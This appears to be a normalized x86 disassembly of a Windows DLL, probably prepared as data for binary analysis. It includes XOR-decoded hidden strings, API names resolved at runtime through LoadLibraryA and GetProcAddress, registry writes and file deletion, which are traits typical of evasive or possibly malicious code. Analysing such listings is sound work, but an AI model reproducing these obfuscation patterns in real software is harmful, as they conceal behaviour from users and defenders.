movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffcc
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x3
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x52
and edx 0xff
mov [ ebp + eax * 2 - 0x64 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x58 ] ax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x36
and edx 0xff
mov [ ebp + eax * 2 - 0x74 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x68 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x4a
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x4
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x10 ] ax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x48
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1a ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffbb
and edx 0xff
mov [ ebp + eax * 2 - 0x34 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x28 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffa0
and edx 0xff
mov [ ebp + eax * 2 - 0xa4 ] dx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x8c ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffa1
and edx 0xff
mov [ ebp + eax * 2 - 0x54 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x48 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff3
and edx 0xff
mov [ ebp + eax * 2 - 0xe0 ] dx
inc eax
cmp eax 0xe
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xc4 ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff80
and edx 0xff
mov [ ebp + eax * 2 - 0x88 ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x78 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffab
and edx 0xff
mov [ ebp + eax * 2 - 0x44 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x38 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x7a
and edx 0xff
mov [ ebp + eax * 2 - 0xc0 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
mov [ ebp - 0xa6 ] ax
mov eax [ ebp + 0x8 ]
dec eax
push esi
cmp eax 0x5
ja r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
jmp [ eax * 4 + jump_table_1005eb44 ]
mov esi [ lstrcmpW@IAT ]
lea ecx [ ebp - 0xc ]
push ecx
push edi
call esi
test eax eax
je r-xdata
mov esi [ lstrcmpW@IAT ]
lea ecx [ ebp - 0xc ]
push ecx
push edi
call esi
test eax eax
jne r-xdata
mov esi [ lstrcmpW@IAT ]
lea ecx [ ebp - 0x34 ]
push ecx
push edi
call esi
test eax eax
jne r-xdata
mov esi [ lstrcmpW@IAT ]
lea eax [ ebp - 0x44 ]
push eax
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x24 ]
push edx
push edi
call esi
test eax eax
je r-xdata
lea edx [ ebp - 0x64 ]
push edx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x7
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0xa4 ]
push edx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x88 ]
push ecx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0xa
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x18 ]
push eax
push edi
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x74 ]
push eax
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x8
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x54 ]
push eax
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax 0xb
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax 0x9
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0xe0 ]
push ecx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x5
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0xc0 ]
push edx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x6
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax 0xc
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
sub_1005eb5c
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push ebx
push [ ebp + 0x1c ]
xor ebx ebx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] eax
call sub_10051cf5
mov eax [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x14 ] bl
je r-xdata
push esi
mov esi [ ebp + 0x10 ]
mov [ eax ] bl
cmp esi ebx
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x14 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
mov eax [ ebp + 0x18 ]
cmp eax ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
xor eax eax
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] edi
cmp edi ebx
jbe r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0xd4 ]
pop edi
mov eax [ ebp - 0x10 ]
mov [ eax ] bl
cmp [ ebp - 0x8 ] ebx
jne r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
cmp [ ebp - 0x4 ] ebx
ja r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
cmp al 0x25
je r-xdata
call sub_1005b670
mov [ eax ] 0x22
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] bl
sub edi [ ebp - 0x4 ]
mov eax edi
cmp [ ebp - 0x14 ] bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
je r-xdata
lea ecx [ ebp - 0x20 ]
movsx eax al
push ecx
push eax
call sub_1001b8e5
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x18 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc esi
xor eax eax
cmp [ esi ] 0x23
jne r-xdata
mov al [ esi ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
inc [ ebp + 0x8 ]
inc esi
dec [ ebp - 0x4 ]
jmp r-xdata
xor ecx ecx
inc ecx
cmp [ ebp - 0x4 ] ecx
jbe r-xdata
push eax
push [ ebp - 0xc ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push eax
mov al [ esi ]
lea edx [ ebp + 0x8 ]
call sub_10083d85
add esp 0x10
test eax eax
je r-xdata
inc eax
inc esi
cmp [ ebp - 0x4 ] ebx
ja r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
inc esi
mov [ ebp - 0x8 ] ecx
mov cl [ esi ]
mov edx [ ebp + 0x8 ]
mov [ edx ] cl
inc [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
mov esi eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub_1005ece8
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0xc ]
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
jmp r-xdata
test eax eax
jle r-xdata
movzx eax ax
pop ebp
retn 0x4
sub_1005ed30
push ebp
mov ebp esp
push 0xffffffff
push sub_1008806a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0xffffffff
lea ecx [ edi + 0x4 ]
push esi
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] esi
push eax
mov [ ecx ] dx
call sub_1002d970
mov [ ebp - 0x4 ] esi
lea esi [ edi + 0x20 ]
mov [ esi ] r--data
mov [ esi + 0x10 ] r--data
mov [ ebp + 0xc ] esi
mov [ esi + 0x60 ] r--data
mov eax 0x1
lea ebx [ esi + 0x18 ]
push ebx
mov [ ebp - 0x4 ] al
push esi
mov [ ebp - 0x10 ] eax
call sub_10040490
mov [ ebp - 0x4 ] 0x2
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
push ebx
mov [ esi + edx ] r--data
call sub_10011df0
xor eax eax
mov [ ebx + 0x3c ] eax
mov [ ebx + 0x40 ] eax
mov [ ebx ] r--data
mov [ edi + 0xc8 ] eax
mov [ edi + 0xcc ] eax
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_1005ee20
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
add ecx 0x18
push ecx
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0x10 ] 0x0
call sub_10063545
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0xc ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp - 0xc ]
sub_1005ee70
mov ecx [ eax ]
push edi
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ esi + 0x10 ]
push r--data
xor edi edi
mov ecx esi
call sub_100449d0
pop edi
test eax eax
je r-xdata
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push eax
call [ DeleteFileW@IAT ]
push 0x0
push r--data
mov ecx esi
call sub_10034100
sub_1005eec0
push ebp
mov ebp esp
mov ecx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ecx + 0xc ]
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x8 ]
mov eax [ eax + esi * 4 ]
test eax eax
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
je r-xdata
pop esi
pop ebp
retn 0x4
call sub_10004aa4
cmp esi [ eax + 0xc ]
jae r-xdata
xor eax eax
mov ecx [ eax + 0x8 ]
mov eax [ ecx + esi * 4 ]
pop esi
pop ebp
retn 0x4
sub_1005ef00
push ebp
mov ebp esp
push 0xffffffff
push sub_10088472
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ edi + 0x4 ]
mov esi [ ebp + 0x8 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_1006bde0
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0xffffffff
push edx
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_1006bde0
push 0xffffffff
push edx
push eax
jmp r-xdata
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] edx
mov [ ecx ] dl
call sub_10037cf0
sub_1005efd0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
xor eax eax
push 0x11c
push eax
lea edi [ esi + 0x4 ]
push edi
mov ebx ecx
mov [ esi + 0x11b0 ] eax
mov [ esi + 0x11b4 ] eax
call sub_1007f8f0
add esp 0xc
push edi
mov [ edi ] 0x11c
call [ GetVersionExW@IAT ]
call [ GetProcessHeap@IAT ]
push 0x104
mov [ esi ] eax
lea eax [ esi + 0x73c ]
push 0x0
push eax
call sub_1007f8f0
push 0x104
lea ecx [ esi + 0x944 ]
push 0x0
push ecx
call sub_1007f8f0
push 0x104
lea edx [ esi + 0xb4c ]
push 0x0
push edx
call sub_1007f8f0
xor eax eax
mov [ esi + 0xd5c ] eax
mov [ esi + 0xd60 ] eax
mov [ esi + 0xd64 ] eax
mov [ esi + 0xd68 ] eax
mov [ esi + 0xd7c ] eax
mov [ esi + 0xd80 ] eax
mov [ esi + 0xd84 ] eax
mov [ esi + 0xd88 ] eax
push 0x104
push eax
mov [ esi + 0xd8c ] ax
lea eax [ esi + 0xda0 ]
push eax
call sub_1007f8f0
push 0x104
lea ecx [ esi + 0xfa8 ]
push 0x0
push ecx
call sub_1007f8f0
push 0x104
lea edi [ esi + 0x534 ]
push 0x0
push edi
call sub_1007f8f0
add esp 0x48
push 0x104
lea edx [ esi + 0x124 ]
push 0x0
push edx
call sub_1007f8f0
push 0x104
lea eax [ esi + 0x32c ]
push 0x0
push eax
call sub_1007f8f0
xor eax eax
add esp 0x18
mov [ esi + 0xd54 ] eax
mov [ esi + 0xd58 ] eax
cmp ebx eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
mov [ esi + 0x120 ] ebx
cmp [ ebx + 0x1596c ] 0x1
jne r-xdata
lea edx [ ebx + 0xc4 ]
mov ebx 0x104
mov eax edi
sub edx edi
nop
test ebx ebx
jne r-xdata
movzx ecx [ edx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
lea edx [ ebp - 0x18 ]
mov eax 0x1e
call sub_10019570
push 0x104
lea eax [ esi + 0x32c ]
push eax
mov eax edx
push eax
call [ ExpandEnvironmentStringsW@IAT ]
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec ebx
jne r-xdata
lea ecx [ ebx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
sub_1005f180
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
test eax eax
jne r-xdata
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x0
push 0x20106
push 0x0
push 0x0
push 0x0
push eax
push edx
call [ RegCreateKeyExW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn
push esi
call [ lstrlenW@IAT ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
lea eax [ eax + eax + 0x2 ]
push eax
mov eax [ ebp + 0xc ]
push esi
push eax
push 0x0
push ecx
push edx
call [ RegSetValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax 0x2
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
call [ RegCloseKey@IAT ]
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov esi 0x3
sub_1005f1fb
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_10021090
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_1005f240
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0x14 ]
test ebx ebx
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebx * 8 ]
mov eax 0xaaaaaaab
mul ecx
shr edx 0x2
lea eax [ edx + edx * 2 ]
lea ecx [ eax + eax ]
lea eax [ ebx * 8 ]
sub eax ecx
sub eax 0x2
je r-xdata
add edx 0x3
sub eax 0x2
jne r-xdata
mov eax 0xaaaaaaab
mul ebx
push esi
push edi
shr edx 0x1
lea edx [ edx + edx * 2 ]
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0x4 ] edx
lea edx [ ebp - 0x10 ]
push edx
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x4 ]
push ecx
lea edi [ ebp - 0x8 ]
lea esi [ ebp + 0x10 ]
lea eax [ ebp + 0x8 ]
call sub_1000f340
mov edx [ ebp - 0x8 ]
add esp 0x14
cmp edx ebx
jae r-xdata
mov [ eax ] edx
mov eax 0xffffffd6
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
inc edx
cmp [ eax ] edx
jae r-xdata
add edx 0x2
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
lea edi [ edx + 0x1 ]
cmp edi ebx
jae r-xdata
xor esi esi
movzx esi [ eax + 0x1 ]
jmp r-xdata
mov [ eax + 0x2 ] 0x3d
add eax 0x3
mov [ eax ] 0x3d
inc eax
jmp r-xdata
and esi 0xf
mov dl [ esi * 4 + r--data ]
mov [ eax + 0x2 ] dl
add eax 0x3
mov [ eax ] 0x3d
inc eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov edx ecx
sar edx 0x2
and edx 0x3f
mov dl [ edx + r--data ]
mov [ eax ] dl
shl ecx 0x4
mov edx esi
sar edx 0x4
add ecx edx
and ecx 0x3f
mov cl [ ecx + r--data ]
mov [ eax + 0x1 ] cl
cmp edi ebx
jae r-xdata
mov edx [ ebp + 0xc ]
mov ecx eax
sub ecx [ ebp + 0x8 ]
pop edi
mov [ edx ] ecx
mov [ eax ] 0x0
pop esi
sub_1005f353
push 0x34
mov eax sub_10085279
call sub_10047689
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x40 ] eax
mov al [ ebx ]
test al al
je r-xdata
xor esi esi
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] 0x0
call sub_10021130
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x3c ] 0xfffffffe
mov [ ebp - 0x34 ] 0x1
mov cl al
mov edx ebx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005b50
mov eax [ ebp - 0x3c ]
call sub_100262c3
retn
mov al [ edi + ebx ]
test al al
je r-xdata
inc edx
mov cl [ edx ]
test cl cl
jne r-xdata
inc [ ebp + 0x10 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov cl [ ebx ]
cmp cl al
jne r-xdata
cmp [ eax + esi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
inc edi
mov al [ edi + ebx ]
test al al
jne r-xdata
add edi [ ebp - 0x34 ]
mov al [ edi + ebx ]
cmp al [ ebx ]
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp al cl
je r-xdata
push 0x7f
pop ecx
cmp [ ebp - 0x34 ] ecx
jae r-xdata
test al al
je r-xdata
movsx eax [ eax + esi ]
add edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x34 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_1002839c
test al al
jne r-xdata
inc esi
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov [ ebp - 0x3c ] esi
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x34 ]
cmp ecx 0x7f
jb r-xdata
mov ecx [ ebp - 0x38 ]
cmp [ ecx + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push 0x7f
pop ecx
movzx eax [ ecx + 0x6 ]
movsx ecx [ edi + ebx ]
cmp ecx eax
jne r-xdata
call sub_100255aa
mov ecx [ ebp - 0x38 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_1002839c
test al al
jne r-xdata
mov [ eax + esi ] cl
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x38 ]
inc [ ebp - 0x34 ]
call sub_1000eff4
or [ ebp - 0x3c ] 0xffffffff
jmp r-xdata
xor esi esi
xor edi edi
mov [ ebp - 0x2d ] 0x0
cmp [ ebp + 0x10 ] esi
jbe r-xdata
sub_1005f4bc
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_10021090
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1001b2d2
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_10048fd4
pop ecx
call sub_1005b670
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_1005b670
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1002f1fa
pop ecx
mov [ esi ] eax
push esi
call sub_10048fd4
pop ecx
test eax eax
je r-xdata
call sub_1005b670
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1002f1fa
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_1005f570
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0x9249249
ja r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10032538
push r--data
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] r--data
call sub_10055e2a
lea eax [ ecx * 8 ]
sub eax ecx
add eax eax
add eax eax
push eax
call sub_1002e3ac
add esp 0x4
test eax eax
jne r-xdata
sub_1005f5d0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
add ecx 0x8
push ecx
mov ecx [ ebp + 0xc ]
push eax
push ecx
push edx
call sub_10051ca7
add esp 0x10
pop ebp
retn 0xc
sub_1005f5ef
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
pop esi
retn
call sub_1006f170
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_1005f620
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x7ffffff
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10032538
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10055e2a
shl ecx 0x5
push ecx
call sub_1002e3ac
add esp 0x4
test eax eax
jne r-xdata
sub_1005f670
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ r--data ]
xor cl cl
xor eax eax
lea esp [ esp ]
mov dl [ eax + esi ]
xor dl cl
xor dl 0x84
inc cl
mov [ ebp + eax - 0x24 ] dl
movzx eax cl
cmp eax 0xb
jb r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x19 ] 0x0
call [ LoadLibraryA@IAT ]
mov ebx eax
mov [ ebp - 0x40 ] ebx
test ebx ebx
jne r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
lea ebx [ ebx ]
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov dl [ eax + esi ]
xor dl cl
xor dl 0x2f
inc cl
mov [ ebp + eax - 0x10 ] dl
movzx eax cl
cmp eax 0x9
jb r-xdata
mov esi [ GetProcAddress@IAT ]
lea eax [ ebp - 0x10 ]
push eax
push ebx
mov [ ebp - 0x7 ] 0x0
call esi
mov [ ebp - 0x44 ] eax
test eax eax
jne r-xdata
push edi
lea edi [ ebp - 0x18 ]
mov eax 0xa3
call sub_1000ce20
mov ecx edi
push ecx
push ebx
call esi
mov ebx eax
test ebx ebx
jne r-xdata
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edi [ ebp - 0x30 ]
mov eax 0x142
call sub_1000ce20
mov eax [ ebp - 0x40 ]
mov edx edi
push edx
push eax
call esi
mov edi eax
test edi edi
jne r-xdata
pop edi
pop esi
lea eax [ ebx + 0x3 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x3c ]
push ecx
push 0xffffffff
push sub_10057940
push sub_10052840
push sub_10040370
push sub_10044ab0
push sub_1003e200
push sub_10009fc0
push sub_10005760
call [ ebp - 0x44 ]
mov esi eax
add esp 0x24
test esi esi
jne r-xdata
lea eax [ edi + 0x4 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push 0x0
push 0x0
push sub_1005ac50
push 0x0
push r--data
push r--data
push esi
call ebx
add esp 0x1c
push esi
